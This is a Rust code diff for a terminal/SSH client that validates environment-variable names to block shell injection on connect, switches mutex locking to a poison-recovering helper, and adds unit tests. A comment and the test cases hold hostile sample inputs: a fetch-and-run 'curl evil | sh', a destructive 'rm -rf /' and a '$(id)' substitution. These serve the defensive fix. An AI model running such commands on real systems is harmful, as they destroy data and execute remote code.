@@ -1,3 +1,4 @@
+use termius_core::sync_ext::MutexExt;
 use crate::state::{AppState, TerminalSession};
 use crate::util;
 use serde::Serialize;
@@ -22,18 +23,29 @@ fn shell_quote(s: &str) -> String {
     format!("'{}'", s.replace('\'', r"'\''"))
 }
 
+/// Whether `key` is a safe environment-variable name to splice into a shell
+/// `export` command. The *value* is single-quoted by [`shell_quote`], but the
+/// name is not, so an attacker-influenced key — e.g. `X; curl evil | sh` coming
+/// from an imported host file — would otherwise run as a command on connect.
+/// Restrict to the POSIX-portable name shape (`[A-Za-z_][A-Za-z0-9_]*`).
+fn is_valid_env_key(key: &str) -> bool {
+    let mut chars = key.chars();
+    matches!(chars.next(), Some(c) if c.is_ascii_alphabetic() || c == '_')
+        && chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
+}
+
 /// Connects to `host_id` and starts an interactive shell, emitting its
 /// output as `terminal-data` events (base64-encoded) until it closes.
 #[tauri::command]
 pub async fn connect_terminal(app: AppHandle, state: State<'_, AppState>, host_id: HostId) -> Result<String, String> {
-    let workspace = state.workspace.lock().expect("lock poisoned").clone();
+    let workspace = state.workspace.lock_recover().clone();
 
     // Collect startup commands before the async SSH calls.
     let startup_cmds: Vec<Vec<u8>> = {
         let mut cmds = Vec::new();
         if let Some(host) = workspace.host(host_id) {
             for ev in &host.env_vars {
-                if !ev.key.is_empty() {
+                if is_valid_env_key(&ev.key) {
                     cmds.push(format!("export {}={}\n", ev.key, shell_quote(&ev.value)).into_bytes());
                 }
             }
@@ -69,12 +81,12 @@ pub async fn connect_terminal(app: AppHandle, state: State<'_, AppState>, host_i
         let _ = input.send(ShellInput::Data(cmd)).await;
     }
 
-    state.terminals.lock().expect("lock poisoned").insert(session_id.clone(), TerminalSession { connection, input });
+    state.terminals.lock_recover().insert(session_id.clone(), TerminalSession { connection, input });
     Ok(session_id)
 }
 
 fn terminal_input(state: &AppState, session_id: &str) -> Result<tokio::sync::mpsc::Sender<ShellInput>, String> {
-    state.terminals.lock().expect("lock poisoned").get(session_id).map(|t| t.input.clone()).ok_or_else(|| "session inconnue".to_string())
+    state.terminals.lock_recover().get(session_id).map(|t| t.input.clone()).ok_or_else(|| "session inconnue".to_string())
 }
 
 #[tauri::command]
@@ -92,7 +104,7 @@ pub async fn resize_terminal(state: State<'_, AppState>, session_id: String, col
 
 #[tauri::command]
 pub fn close_terminal(state: State<'_, AppState>, session_id: String) -> Result<(), String> {
-    state.terminals.lock().expect("lock poisoned").remove(&session_id);
+    state.terminals.lock_recover().remove(&session_id);
     Ok(())
 }
 
@@ -200,7 +212,7 @@ pub async fn open_local_terminal(app: AppHandle, state: State<'_, AppState>, she
         let _ = app_handle.emit("terminal-closed", TerminalClosedEvent { id: emit_id });
     });
 
-    state.local_terminals.lock().expect("lock poisoned").insert(
+    state.local_terminals.lock_recover().insert(
         session_id.clone(),
         crate::state::LocalTerminalSession { master: crate::state::SendMasterPty(pair.master), writer },
     );
@@ -212,7 +224,7 @@ pub async fn open_local_terminal(app: AppHandle, state: State<'_, AppState>, she
 pub async fn write_local_terminal(state: State<'_, AppState>, session_id: String, data: String) -> Result<(), String> {
     use std::io::Write;
     let bytes = util::decode(&data).map_err(|e| e.to_string())?;
-    let mut sessions = state.local_terminals.lock().expect("lock poisoned");
+    let mut sessions = state.local_terminals.lock_recover();
     let session = sessions.get_mut(&session_id).ok_or_else(|| "session inconnue".to_string())?;
     session.writer.write_all(&bytes).map_err(|e| e.to_string())
 }
@@ -220,13 +232,46 @@ pub async fn write_local_terminal(state: State<'_, AppState>, session_id: String
 #[tauri::command]
 pub async fn resize_local_terminal(state: State<'_, AppState>, session_id: String, cols: u16, rows: u16) -> Result<(), String> {
     use portable_pty::PtySize;
-    let sessions = state.local_terminals.lock().expect("lock poisoned");
+    let sessions = state.local_terminals.lock_recover();
     let session = sessions.get(&session_id).ok_or_else(|| "session inconnue".to_string())?;
     session.master.0.resize(PtySize { rows, cols, pixel_width: 0, pixel_height: 0 }).map_err(|e| e.to_string())
 }
 
 #[tauri::command]
 pub fn close_local_terminal(state: State<'_, AppState>, session_id: String) -> Result<(), String> {
-    state.local_terminals.lock().expect("lock poisoned").remove(&session_id);
+    state.local_terminals.lock_recover().remove(&session_id);
     Ok(())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn valid_env_keys_are_accepted() {
+        for ok in ["PATH", "_x1", "MY_VAR", "A", "_"] {
+            assert!(is_valid_env_key(ok), "{ok:?} should be a valid env key");
+        }
+    }
+
+    #[test]
+    fn injection_shaped_env_keys_are_rejected() {
+        for bad in [
+            "",
+            "1abc",
+            "A B",
+            "X; rm -rf /",
+            "X=$(id)",
+            "X\ncurl evil | sh",
+            "PATH-EXTRA",
+        ] {
+            assert!(!is_valid_env_key(bad), "{bad:?} must be rejected");
+        }
+    }
+
+    #[test]
+    fn shell_quote_neutralises_single_quotes() {
+        assert_eq!(shell_quote("plain"), "'plain'");
+        assert_eq!(shell_quote("a'b"), r"'a'\''b'");
+    }
 }
